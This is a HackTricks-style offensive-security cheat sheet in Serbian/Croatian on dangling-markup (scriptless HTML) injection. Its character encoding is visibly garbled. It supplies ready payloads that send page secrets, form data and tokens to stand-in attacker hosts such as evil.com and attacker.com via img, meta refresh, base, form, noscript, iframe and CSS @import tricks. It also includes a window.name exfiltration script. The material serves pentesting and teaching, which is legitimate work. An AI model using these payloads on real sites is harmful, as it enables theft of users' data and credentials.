# Dangling Markup - HTML scriptless injection

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Rezime

Ova tehnika se moÅ¾e koristiti za izvlaÄenje informacija od korisnika kada se pronaÄ‘e **HTML ubacivanje**. Ovo je veoma korisno ako **ne moÅ¾ete pronaÄ‡i naÄin za iskoriÅ¡Ä‡avanje** [**XSS** ](../xss-cross-site-scripting/), ali moÅ¾ete **ubaciti neke HTML tagove**.\
TakoÄ‘e je korisno ako se neki **tajni podaci Äuvaju u Äistom tekstu** u HTML-u i Å¾elite ih **izvuÄ‡i** sa klijenta, ili ako Å¾elite da zavarate izvrÅ¡avanje nekog skripta.

Nekoliko tehnika koje su ovde komentarisane mogu se koristiti za zaobilaÅ¾enje nekih [**Content Security Policy**](../content-security-policy-csp-bypass/) pravila izvlaÄenjem informacija na neoÄekivane naÄine (html tagovi, CSS, http-meta tagovi, forme, base...).

## Glavne primene

### KraÄ‘a tajnih podataka u Äistom tekstu

Ako ubacite `<img src='http://evil.com/log.cgi?` kada se stranica uÄita, Å¾rtva Ä‡e vam poslati sav kod izmeÄ‘u ubaÄenih `img` tagova i sledeÄ‡eg navodnika unutar koda. Ako se neki tajni podatak nalazi u tom delu, ukradeÄ‡ete ga (isto moÅ¾ete uraditi koristeÄ‡i dvostruki navodnik, pogledajte koji bi mogao biti interesantniji za upotrebu).

Ako je `img` tag zabranjen (na primer, zbog CSP-a), takoÄ‘e moÅ¾ete koristiti `<meta http-equiv="refresh" content="4; URL='http://evil.com/log.cgi?`.
```html
<img src='http://attacker.com/log.php?HTML=
<meta http-equiv="refresh" content='0; url=http://evil.com/log.php?text=
<meta http-equiv="refresh" content='0;URL=ftp://evil.com?a=
```
Napomena da **Chrome blokira HTTP URL-ove** sa "<" ili "\n" u njima, pa moÅ¾ete pokuÅ¡ati sa drugim protokolima kao Å¡to je "ftp".

TakoÄ‘e moÅ¾ete zloupotrebiti CSS `@import` (Ä‡e poslati sav kod sve dok ne pronaÄ‘e ";")
```html
<style>@import//hackvertor.co.uk?     <--- Injected
<b>steal me!</b>;
```
MoÅ¾ete takoÄ‘e koristiti **`<table`**:
```html
<table background='//your-collaborator-id.burpcollaborator.net?'
```
MoÅ¾ete takoÄ‘e umetnuti `<base` oznaku. Sve informacije Ä‡e biti poslate sve dok se navodnik ne zatvori, ali zahteva neku interakciju korisnika (korisnik mora kliknuti na neki link, jer Ä‡e oznaka base promeniti domen na koji link pokazuje):
```html
<base target='        <--- Injected
steal me'<b>test</b>
```
### KraÄ‘a formi

Dangling Markup (HTML) Scriptless Injection (DMSI) je tehnika koja omoguÄ‡ava kraÄ‘u podataka iz formi na web stranicama. Ova tehnika se koristi kada je web stranica podloÅ¾na DMSI napadima.

DMSI napad se izvodi ubacivanjem zlonamernog koda u HTML kod web stranice. Ovaj kod se obiÄno ubacuje u komentare, skrivene elemente ili neaktivne delove stranice. Kada korisnik popuni formu na web stranici, zlonamerni kod se aktivira i podaci iz forme se Å¡alju napadaÄu.

Da biste izveli DMSI napad, prvo morate identifikovati ciljanu web stranicu koja je podloÅ¾na ovom napadu. Zatim, prouÄite HTML kod stranice kako biste pronaÅ¡li potencijalne taÄke za ubacivanje zlonamernog koda.

Nakon Å¡to pronaÄ‘ete odgovarajuÄ‡e mesto za ubacivanje koda, moÅ¾ete koristiti razliÄite tehnike za kraÄ‘u podataka iz forme. Na primer, moÅ¾ete koristiti JavaScript za presretanje i slanje podataka na udaljeni server ili moÅ¾ete koristiti CSRF (Cross-Site Request Forgery) napad kako biste prevarili korisnika da samostalno poÅ¡alje podatke.

VaÅ¾no je napomenuti da je DMSI napad ilegalan i da se ne sme koristiti bez pristanka vlasnika web stranice. Ova tehnika se Äesto koristi u etiÄkom hakovanju kako bi se identifikovali propusti u bezbednosti i pomoglo u njihovom otklanjanju.
```html
<base href='http://evil.com/'>
```
Zatim, obrasci koji Å¡alju podatke na putanju (poput `<form action='update_profile.php'>`) Ä‡e slati podatke na zlonamernu domenu.

### KraÄ‘a obrazaca 2

Postavite zaglavlje obrasca: `<form action='http://evil.com/log_steal'>` ovo Ä‡e prebrisati sledeÄ‡e zaglavlje obrasca i svi podaci iz obrasca Ä‡e biti poslati napadaÄu.

### KraÄ‘a obrazaca 3

Dugme moÅ¾e promeniti URL na koji Ä‡e biti poslati podaci obrasca pomoÄ‡u atributa "formaction":
```html
<button name=xss type=submit formaction='https://google.com'>I get consumed!
```
NapadaÄ moÅ¾e koristiti ovo da ukrade informacije.

### KraÄ‘a tajnih podataka u Äistom tekstu 2

KoristeÄ‡i poslednju pomenutu tehniku za kraÄ‘u formi (ubacivanje nove zaglavlje forme), moÅ¾ete zatim ubaciti novo polje za unos:
```html
<input type='hidden' name='review_body' value="
```
i ovo polje za unos Ä‡e sadrÅ¾avati sav sadrÅ¾aj izmeÄ‘u dvostrukih navodnika i sledeÄ‡ih dvostrukih navodnika u HTML-u. Ovaj napad kombinuje "_**KraÄ‘u tajnih podataka u Äistom tekstu**_" sa "_**KraÄ‘om formi2**_".

MoÅ¾ete uraditi istu stvar ubacivanjem forme i `<option>` oznake. Svi podaci do zatvorene `</option>` oznake Ä‡e biti poslati:
```html
<form action=http://google.com><input type="submit">Click Me</input><select name=xss><option
```
### Ubacivanje parametra u formu

MoÅ¾ete promeniti putanju forme i uneti nove vrednosti kako bi se izvrÅ¡ila neoÄekivana radnja:
```html
<form action='/change_settings.php'>
<input type='hidden' name='invite_user'
value='fredmbogo'>                                        â† Injected lines

<form action="/change_settings.php">                        â† Existing form (ignored by the parser)
...
<input type="text" name="invite_user" value="">             â† Subverted field
...
<input type="hidden" name="xsrf_token" value="12345">
...
</form>
```
### KraÄ‘a tajnih podataka u Äistom tekstu putem noscript

`<noscript></noscript>` je oznaka Äiji Ä‡e se sadrÅ¾aj interpretirati ako pregledaÄ ne podrÅ¾ava JavaScript (moÅ¾ete omoguÄ‡iti/onemoguÄ‡iti JavaScript u Chrome-u na [chrome://settings/content/javascript](chrome://settings/content/javascript)).

NaÄin da se izvrÅ¡i eksfiltracija sadrÅ¾aja web stranice od taÄke ubacivanja do dna, ka sajtu pod kontrolom napadaÄa, je ubacivanje sledeÄ‡eg koda:
```html
<noscript><form action=http://evil.com><input type=submit style="position:absolute;left:0;top:0;width:100%;height:100%;" type=submit value=""><textarea name=contents></noscript>
```
### Bypassiranje CSP-a sa korisniÄkom interakcijom

Iz ovog [portswiggers istraÅ¾ivanja](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup) moÅ¾ete nauÄiti da Äak i u **najstroÅ¾e ograniÄenim CSP okruÅ¾enjima** joÅ¡ uvek moÅ¾ete **izfiltrirati podatke** uz malo **korisniÄke interakcije**. U ovom sluÄaju Ä‡emo koristiti payload:
```html
<a href=http://attacker.net/payload.html><font size=100 color=red>You must click me</font></a>
<base target='
```
Napomena da Ä‡ete **Å¾rtvu** zamoliti da **klikne na link** koji Ä‡e je **preusmeriti** na **payload** koji kontroliÅ¡ete. TakoÄ‘e, napomenite da Ä‡e **`target`** atribut unutar **`base`** taga sadrÅ¾ati **HTML sadrÅ¾aj** do sledeÄ‡eg jednostrukog navodnika.\
To Ä‡e rezultirati da je **vrednost** **`window.name`** ako se klikne na link Ä‡e biti sav taj **HTML sadrÅ¾aj**. Stoga, poÅ¡to **kontroliÅ¡ete stranicu** na koju Å¾rtva pristupa klikom na link, moÅ¾ete pristupiti tom **`window.name`** i **ekstraktovati** te podatke:
```html
<script>
if(window.name) {
new Image().src='//your-collaborator-id.burpcollaborator.net?'+encodeURIComponent(window.name);
</script>
```
### ZavaravajuÄ‡i tok skripte 1 - Napad na HTML namespace

Ubacite novu oznaku sa id-om unutar HTML-a koja Ä‡e prebrisati sledeÄ‡u oznaku i sa vrednoÅ¡Ä‡u koja Ä‡e uticati na tok skripte. U ovom primeru birate sa kim Ä‡e se informacija deliti:
```html
<input type='hidden' id='share_with' value='fredmbogo'>     â† Injected markup
...
Share this status update with:                              â† Legitimate optional element of a dialog
<input id='share_with' value=''>

...

function submit_status_update() {
...
request.share_with = document.getElementById('share_with').value;
...
}
```
### ZavaravajuÄ‡i tok skripte 2 - Napad na imenik skripte

Kreirajte promenljive unutar JavaScript imenika umetanjem HTML oznaka. Zatim Ä‡e ova promenljiva uticati na tok aplikacije:
```html
<img id='is_public'>                                        â† Injected markup

...

// Legitimate application code follows

function retrieve_acls() {
...
if (response.access_mode == AM_PUBLIC)                    â† The subsequent assignment fails in IE
is_public = true;
else
is_public = false;
}

function submit_new_acls() {
...
if (is_public) request.access_mode = AM_PUBLIC;           â† Condition always evaluates to true
...
}
```
### Zloupotreba JSONP-a

Ako pronaÄ‘ete JSONP interfejs, moÅ¾ete pozvati proizvoljnu funkciju sa proizvoljnim podacima:
```html
<script src='/editor/sharing.js'>:              â† Legitimate script
function set_sharing(public) {
if (public) request.access_mode = AM_PUBLIC;
else request.access_mode = AM_PRIVATE;
...
}

<script src='/search?q=a&call=set_sharing'>:    â† Injected JSONP call
set_sharing({ ... })
```
Ili Äak moÅ¾ete pokuÅ¡ati izvrÅ¡iti neki JavaScript:
```html
<script src='/search?q=a&call=alert(1)'></script>
```
### Zloupotreba iframe-a

Dete dokument poseduje moguÄ‡nost pregledanja i izmene svojstva `location` svojih roditelja, Äak i u situacijama prelaska preko granica izvora. Ovo omoguÄ‡ava ugraÄ‘ivanje skripte unutar **iframe-a** koja moÅ¾e preusmeriti klijenta na proizvoljnu stranicu:
```html
<html><head></head><body><script>top.window.location = "https://attacker.com/hacked.html"</script></body></html>
```
Ovo se moÅ¾e ublaÅ¾iti sa neÄim poput: `sandbox=' allow-scripts allow-top-navigation'`

Isto tako, iframe moÅ¾e biti zloupotrebljen kako bi se procurele osetljive informacije sa druge stranice **koristeÄ‡i atribut imena iframe-a**. To je zato Å¡to moÅ¾ete kreirati iframe koji iframe-uje sam sebe zloupotrebom HTML ubacivanja koje Äini da **osetljive informacije izgledaju unutar atributa imena iframe-a**, a zatim pristupiti tom imenu iz poÄetnog iframe-a i procureti ga.
```html
<script>
function cspBypass(win) {
win[0].location = 'about:blank';
setTimeout(()=>alert(win[0].name), 500);
}
</script>

<iframe src="//subdomain1.portswigger-labs.net/bypassing-csp-with-dangling-iframes/target.php?email=%22><iframe name=%27" onload="cspBypass(this.contentWindow)"></iframe>
```
Za viÅ¡e informacija pogledajte [https://portswigger.net/research/bypassing-csp-with-dangling-iframes](https://portswigger.net/research/bypassing-csp-with-dangling-iframes)

### \<meta zloupotreba

MoÅ¾ete koristiti **`meta http-equiv`** da izvrÅ¡ite **nekoliko radnji** kao Å¡to je postavljanje kolaÄiÄ‡a: `<meta http-equiv="Set-Cookie" Content="SESSID=1">` ili izvrÅ¡avanje preusmeravanja (u ovom sluÄaju za 5s): `<meta name="language" content="5;http://attacker.svg" HTTP-EQUIV="refresh" />`

Ovo se moÅ¾e **izbeÄ‡i** sa **CSP** u vezi sa **http-equiv** (`Content-Security-Policy: default-src 'self';`, ili `Content-Security-Policy: http-equiv 'self';`)

### Novi \<portal HTML tag

MoÅ¾ete pronaÄ‡i vrlo **interesantno istraÅ¾ivanje** o iskoriÅ¡Ä‡ivim ranjivostima \<portal> oznake [ovde](https://research.securitum.com/security-analysis-of-portal-element/).\
Trenutno je potrebno omoguÄ‡iti portal oznaku u Chrome-u na `chrome://flags/#enable-portals` ili neÄ‡e raditi.
```html
<portal src='https://attacker-server?
```
### HTML Curenje

Nisu sve metode curenja povezanosti u HTML-u korisne za Dangling Markup, ali ponekad mogu biti od pomoÄ‡i. Provjerite ih ovdje: [https://github.com/cure53/HTTPLeaks/blob/master/leak.html](https://github.com/cure53/HTTPLeaks/blob/master/leak.html)

## SS-Curenje

Ovo je **kombinacija** izmeÄ‘u **dangling markup i XS-Curenja**. S jedne strane, ranjivost omoguÄ‡ava **ubrizgavanje HTML-a** (ali ne i JS-a) na stranicu **iste porijekla** kao i ona koju Ä‡emo napadati. S druge strane, neÄ‡emo **izravno napasti** stranicu na koju moÅ¾emo ubrizgati HTML, veÄ‡ **drugom stranicom**.

{% content-ref url="ss-leaks.md" %}
[ss-leaks.md](ss-leaks.md)
{% endcontent-ref %}

## XS-Pretraga/XS-Curenje

XS-Pretraga je usmjerena na **izvlaÄenje informacija preko granica porijekla** zloupotrebom **napada na boÄni kanal**. Stoga, to je drugaÄija tehnika od Dangling Markup-a, meÄ‘utim, neke od tehnika zloupotrebljavaju ukljuÄivanje HTML oznaka (s izvrÅ¡enjem i bez izvrÅ¡enja JS-a), poput [**CSS ubrizgavanja**](../xs-search.md#css-injection) ili [**UÄitavanja slika na zahtjev**](../xs-search.md#image-lazy-loading)**.**

{% content-ref url="../xs-search.md" %}
[xs-search.md](../xs-search.md)
{% endcontent-ref %}

## Lista za otkrivanje Brute-Force napada

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/dangling_markup.txt" %}

## Reference

* [https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057](https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057)
* [http://lcamtuf.coredump.cx/postxss/](http://lcamtuf.coredump.cx/postxss/)
* [http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/](http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/)
* [https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup)

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite vidjeti **oglaÅ¡avanje vaÅ¡e kompanije u HackTricks-u** ili **preuzeti HackTricks u PDF formatu** Provjerite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podijelite svoje hakiranje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
